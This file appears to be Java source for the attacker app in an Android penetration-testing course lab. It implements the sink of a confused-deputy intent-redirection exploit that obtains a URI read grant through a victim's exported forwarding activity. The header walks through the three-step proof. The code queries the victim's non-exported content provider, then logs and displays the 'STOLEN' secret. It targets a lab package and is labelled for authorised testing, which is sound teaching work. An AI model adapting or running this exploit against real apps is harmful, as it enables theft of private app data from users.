// examples/hijacker-app/GrantSinkActivity.java
// Package: com.pentest.ch30.attacker
//
// Where a laundered URI grant is cashed in.
//
// ---------------------------------------------------------------------------
// THE THREE-STEP PROOF THIS ACTIVITY EXISTS TO PRODUCE
// ---------------------------------------------------------------------------
//   STEP 1 (control). Query the victim's provider DIRECTLY. It is declared
//          exported="false", so this must fail with a SecurityException. Running
//          this first is what turns step 3 from a claim into a measurement --
//          without it, a sceptical reader can say the provider was reachable all
//          along.
//
//   STEP 2. Send the victim's exported DeputyActivity an Intent carrying, in the
//          "next" extra, a SECOND Intent that names THIS activity, sets the
//          victim's content:// URI as its data, and sets
//          FLAG_GRANT_READ_URI_PERMISSION.
//
//   STEP 3. The deputy calls startActivity() on that nested Intent. Because the
//          caller at that instant is the VICTIM, and the victim's provider
//          declares grantUriPermissions="true", the system issues a read grant
//          on that URI -- to us. This activity then queries the same URI that
//          failed in step 1, and it succeeds.
//
// Nothing about the provider changed between step 1 and step 3. The only thing
// that changed is who asked the system to start an activity. That is the
// confused deputy, in three adb commands.
//
// ---------------------------------------------------------------------------
// WHERE THE BOUNDARY IS
// ---------------------------------------------------------------------------
// 27-ContentProviders owns what the grant is worth and how grants are tracked.
// 26-Intent owns the redirection primitive. This file is the ACTIVITY side:
// the sink an attacker names, and the reason an exported Activity that forwards
// Intents is a privilege-lending device rather than a routing convenience.
//
// AUTHORISED TESTING ONLY.

package com.pentest.ch30.attacker;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

public class GrantSinkActivity extends Activity {

    private static final String TAG = "CH30";

    /** The victim's provider. Declared exported="false" in the victim manifest. */
    private static final Uri TARGET =
            Uri.parse("content://com.pentest.ch30.victim.secrets/secret/1");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        StringBuilder report = new StringBuilder();
        report.append("GrantSinkActivity taskId=").append(getTaskId()).append('\n');

        Intent i = getIntent();
        Log.i(TAG, "SINK reached. data=" + i.getData()
                + " flags=0x" + Integer.toHexString(i.getFlags())
                + " callingActivity=" + getCallingActivity());

        // Read whichever URI we were handed, falling back to the hard-coded one
        // so the activity is also usable as the step-1 control.
        Uri uri = i.getData() != null ? i.getData() : TARGET;
        report.append("uri=").append(uri).append('\n');

        try {
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c == null) {
                report.append("RESULT: query returned null cursor\n");
            } else {
                while (c.moveToNext()) {
                    // Column 1 is `secret` -- see the victim's SecretProvider.
                    String secret = c.getString(c.getColumnCount() - 1);
                    Log.i(TAG, "SINK STOLE: " + secret);
                    report.append("STOLEN: ").append(secret).append('\n');
                }
                c.close();
            }
        } catch (SecurityException e) {
            // This is the EXPECTED outcome in step 1, and a FAILED exploit in
            // step 3. Print the whole message: the platform names the uid it
            // refused and the permission it wanted, which is free reconnaissance.
            Log.i(TAG, "SINK DENIED: " + e.getMessage());
            report.append("DENIED: ").append(e.getMessage()).append('\n');
        } catch (Exception e) {
            Log.i(TAG, "SINK ERROR: " + e);
            report.append("ERROR: ").append(e).append('\n');
        }

        TextView t = new TextView(this);
        t.setText(report.toString());
        t.setTextSize(15);
        t.setTextColor(Color.WHITE);
        t.setBackgroundColor(Color.parseColor("#B00020"));
        t.setPadding(30, 140, 30, 30);
        setContentView(t);
    }
}
